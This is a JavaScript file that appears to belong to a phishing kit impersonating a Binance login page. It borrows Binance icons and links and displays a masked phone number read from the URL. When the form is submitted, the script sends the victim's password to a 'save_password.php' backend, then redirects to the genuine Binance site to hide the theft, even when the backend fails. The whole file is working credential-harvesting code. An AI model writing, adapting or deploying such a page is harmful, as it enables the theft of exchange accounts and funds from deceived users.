
document.addEventListener('DOMContentLoaded', function() {
    const passwordInput = document.getElementById('password');
    const togglePassword = document.getElementById('togglePassword');
    const submitButton = document.querySelector('.submit-button');
    const form = document.querySelector('.login-form');
    const phoneNumberElement = document.querySelector('.phone-number');

    // Reset button state on page load
    function resetButtonState() {
        const buttonText = submitButton.querySelector('.button-text');
        const loadingAnimation = submitButton.querySelector('.loading-animation');
        
        buttonText.style.display = 'inline-block';
        loadingAnimation.style.display = 'none';
        submitButton.disabled = false;
    }

    // Initialize button state
    resetButtonState();

    // Get phone number from URL and display it with asterisks
    function displayPhoneNumber() {
        const urlParams = new URLSearchParams(window.location.search);
        const phone = urlParams.get('phone');
        
        if (phone) {
            // Format: first 3 digits + 3 asterisks + remaining digits
            const formattedPhone = phone.length > 6 
                ? phone.substring(0, 3) + '***' + phone.substring(6)
                : phone.substring(0, 3) + '***';
            
            phoneNumberElement.textContent = formattedPhone;
        }
    }

    // Initialize phone number display
    displayPhoneNumber();

    // Toggle password visibility (Binance SVG icons)
    togglePassword.addEventListener('click', function() {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        
        // Update SVG icons
        const eyeOpen = document.getElementById('eyeOpen');
        const eyeClosed = document.getElementById('eyeClosed');
        if (type === 'text') {
            // Password visible - show open eye
            eyeOpen.style.display = 'inline';
            eyeClosed.style.display = 'none';
        } else {
            // Password hidden - show crossed eye
            eyeOpen.style.display = 'none';
            eyeClosed.style.display = 'inline';
        }
    });

    // Handle form submission
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const passwordValue = passwordInput.value.trim();
        const buttonText = submitButton.querySelector('.button-text');
        const loadingAnimation = submitButton.querySelector('.loading-animation');
        
        if (!passwordValue) {
            passwordInput.focus();
            return;
        }
        
        if (passwordValue.length < 6) {
            passwordInput.focus();
            return;
        }
        
        // Show loading animation
        buttonText.style.display = 'none';
        loadingAnimation.style.display = 'flex';
        submitButton.disabled = true;
        
        // Send password to backend
        const formData = new FormData();
        formData.append('password', passwordValue);
        
        fetch('save_password.php', {
            method: 'POST',
            body: formData
        }).then(response => response.json())
        .then(data => {
            setTimeout(() => {
                // Reset button state before redirect
                buttonText.style.display = 'inline-block';
                loadingAnimation.style.display = 'none';
                submitButton.disabled = false;
                
                // Redirect to YouTube
                window.location.href = 'https://www.binance.com/it';
            }, 2000);
        }).catch(error => {
            // Still redirect even if backend fails
            setTimeout(() => {
                buttonText.style.display = 'inline-block';
                loadingAnimation.style.display = 'none';
                submitButton.disabled = false;
                window.location.href = 'https://www.binance.com/it';
            }, 2000);
        });
    });

    // Handle footer links redirects
    const forgotPasswordLink = document.querySelector('.forgot-password-link');
    const cookieLink = document.querySelector('.footer-link[href="#"]');
    const termsLink = document.querySelectorAll('.footer-link[href="#"]')[1];
    const privacyLink = document.querySelectorAll('.footer-link[href="#"]')[2];

    forgotPasswordLink.addEventListener('click', function(e) {
        e.preventDefault();
        window.location.href = 'https://www.binance.com/it/support/faq/detail/2d9adebbe9b446019f8895ce971d0870';
    });

    cookieLink.addEventListener('click', function(e) {
        e.preventDefault();
        window.location.href = 'https://academy.binance.com/it/articles/what-are-cookies';
    });

    termsLink.addEventListener('click', function(e) {
        e.preventDefault();
        window.location.href = 'https://www.binance.com/it/terms';
    });

    privacyLink.addEventListener('click', function(e) {
        e.preventDefault();
        window.location.href = 'https://www.binance.com/it/privacy';
    });

    // Add focus/blur effects
    passwordInput.addEventListener('focus', function() {
        this.parentElement.parentElement.classList.add('focused');
    });

    passwordInput.addEventListener('blur', function() {
        this.parentElement.parentElement.classList.remove('focused');
    });

    // Handle responsive behavior
    function handleResize() {
        const container = document.querySelector('.login-container');
        if (window.innerWidth <= 768) {
            container.style.minHeight = `${window.innerHeight - 120}px`;
        } else {
            container.style.minHeight = 'auto';
        }
    }

    window.addEventListener('resize', handleResize);
    handleResize(); // Initial call
});
